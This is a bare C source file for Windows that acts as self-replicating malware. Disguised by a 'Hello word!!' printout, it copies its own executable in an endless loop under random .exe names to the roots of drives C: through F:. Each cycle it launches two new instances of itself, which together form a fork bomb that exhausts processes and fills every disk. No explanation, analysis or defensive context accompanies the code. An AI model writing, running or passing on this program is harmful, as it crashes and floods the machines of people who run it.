#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main()
{
    char myappname[200] = {0};
    char randed [16] = {0};
    char lastname [21] = {0};
    unsigned int i,I,L;
    srand((unsigned) time(NULL)+I+L);
    GetModuleFileName(NULL,myappname,200);
    while(1)
    {
        for(i=0;i<1000;i++)
        {
            L=rand()%6+5;
            for(I=0;I<L;I++)randed[I]=((rand()%3)/2)?rand()%9+48:((rand()%2)?rand()%26+65:rand()%26+97);
            randed[I]='\0';
            strcat(randed,".exe");

            {
            strcpy(lastname,"c:\\");
            strcat(lastname,randed);
            CopyFile(myappname,lastname,0);
            }

            {
            strcpy(lastname,"d:\\");
            strcat(lastname,randed);
            CopyFile(myappname,lastname,0);
            }

            {
            strcpy(lastname,"e:\\");
            strcat(lastname,randed);
            CopyFile(myappname,lastname,0);
            }

            {
            strcpy(lastname,"f:\\");
            strcat(lastname,randed);
            CopyFile(myappname,lastname,0);
            }

            printf("Hello word!!                       NO.%d\n",i);
            Sleep(5);
        }
        ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open",myappname,myappname,NULL,SW_SHOWNORMAL);
    }
    return 0;
}
